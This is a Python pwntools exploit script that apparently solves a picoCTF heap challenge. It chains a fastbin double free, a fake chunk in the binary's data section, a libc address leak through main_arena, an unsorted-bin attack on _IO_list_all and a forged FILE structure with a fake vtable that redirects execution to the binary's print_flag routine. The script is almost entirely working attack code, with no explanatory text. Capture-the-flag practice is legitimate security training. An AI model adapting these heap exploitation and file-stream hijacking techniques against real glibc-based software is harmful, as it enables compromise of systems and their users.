from pwn import *

HOST, PORT = '0.0.0.0', 31337
# HOST, PORT = 'fickle-tempest.picoctf.net', 54316
r = remote(HOST, PORT)

def add_chunk(size, data):
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', f'{size}')
    r.sendlineafter('> ', data)

def free_chunk(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', str(idx))

def introduce(data):
    r.sendlineafter('> ', data)

def reintroduce(data):
    r.sendlineafter('> ', '3')
    r.sendlineafter('> ', data)


data = 0x602040
print_flag = 0x400cc4

introduce(flat([
    p64(0), p64(0x61), p64(0)
]))
add_chunk(0x58, b'A')
add_chunk(0x58, b'B')
free_chunk(0)
free_chunk(1)
free_chunk(0)
add_chunk(0x58, p64(data))
add_chunk(0x58, b'C' * 0x57)
add_chunk(0x58, b'D' * 0x57)
add_chunk(0x58, b'E' * 0x57)
fake_chunk = p64(0) + p64(0x91) + p64(0x21) * 23
reintroduce(fake_chunk)
free_chunk(5)
reintroduce(b'A' * 0x15 + b' \n')
r.recvuntil(b'\n\n')
libc_main_arena_88 = u64(r.recvline().strip(b'!\n').ljust(8, b'\x00'))
libc = libc_main_arena_88 - 88 - 0x3c4b20
libc_freehook = libc + 0x3c67a8
libc_io_list_all = libc + 0x3c5520
pop_rdi = libc + 0x400d83
reintroduce(flat([
    p64(0), p64(0x61), p64(libc_main_arena_88), p64(libc_io_list_all-0x10)
]))
add_chunk(0x58, '')
payload = p64(0)
payload += p64(0x61)
fake_file = b'flag.txt\x00'
fake_file = fake_file.ljust(0x20, b'\x00')
fake_file += p64(0)
fake_file += p64(1)
fake_file = fake_file.ljust(0xc0, b'\x00')
fake_file += p64(0)
fake_file = fake_file.ljust(0xd8, b'\x00')
fake_file += p64(data + 0x10 + 0xd8)
fake_vtable = p64(0) * 3
fake_vtable += p64(print_flag)
payload += fake_file + fake_vtable
print(hex(len(payload)))
reintroduce(payload)
r.interactive()